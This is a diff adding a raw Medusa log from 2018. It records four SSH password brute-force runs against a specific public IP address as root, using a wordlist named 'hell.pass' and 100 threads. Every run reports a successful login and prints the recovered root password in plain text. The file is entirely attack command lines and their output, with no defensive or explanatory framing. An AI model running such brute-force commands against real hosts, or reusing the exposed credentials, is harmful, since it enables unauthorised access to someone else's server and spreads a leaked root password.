@@ -1,0 +1,16 @@
+# Medusa v.2.2 (2018-03-15 11:01:15)
+# medusa -h 134.96.111.196 -u root -P hell.pass -M ssh -t 100 -O log.txt
+ACCOUNT FOUND: [ssh] Host: 134.96.111.196 User: root Password: admin2017 [SUCCESS]
+# Medusa has finished (2018-03-15 11:01:18).
+# Medusa v.2.2 (2018-03-15 11:02:24)
+# medusa -h 134.96.111.196 -u root -P hell.pass -M ssh -t 100 -O log.txt
+ACCOUNT FOUND: [ssh] Host: 134.96.111.196 User: root Password: admin2017 [SUCCESS]
+# Medusa has finished (2018-03-15 11:02:26).
+# Medusa v.2.2 (2018-03-15 11:03:01)
+# medusa -h 134.96.111.196 -u root -P hell.pass -M ssh -t 100 -O log.txt
+ACCOUNT FOUND: [ssh] Host: 134.96.111.196 User: root Password: admin2017 [SUCCESS]
+# Medusa has finished (2018-03-15 11:03:03).
+# Medusa v.2.2 (2018-03-15 11:03:57)
+# medusa -h 134.96.111.196 -u root -P hell.pass -M ssh -t 100 -v 12 -O log.txt
+ACCOUNT FOUND: [ssh] Host: 134.96.111.196 User: root Password: admin2017 [SUCCESS]
+# Medusa has finished (2018-03-15 11:03:59).
